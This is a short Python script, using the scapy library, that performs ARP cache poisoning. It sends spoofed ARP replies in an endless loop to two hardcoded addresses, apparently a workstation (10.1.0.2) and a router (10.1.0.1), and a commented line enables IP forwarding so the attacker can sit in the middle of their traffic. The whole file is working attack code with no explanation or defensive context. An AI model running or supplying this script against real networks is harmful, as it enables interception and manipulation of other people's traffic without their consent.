import scapy.all as scapy
import time

# os.system("echo 1 > /proc/sys/net/ipv4/ip_forward") IP FORWARDING

def get_mac(ip):
    arp_request = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout = 5, verbose = False)[0]
    return answered_list[0][1].hwsrc

def arp_cache_poisoning(target_ip, spoofed_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoofed_ip)
    scapy.send(packet, verbose=0)

ws2 = "10.1.0.2" 
r1 = "10.1.0.1" 


while True:
    arp_cache_poisoning(ws2, r1)
    arp_cache_poisoning(r1, ws2)
    time.sleep(1)
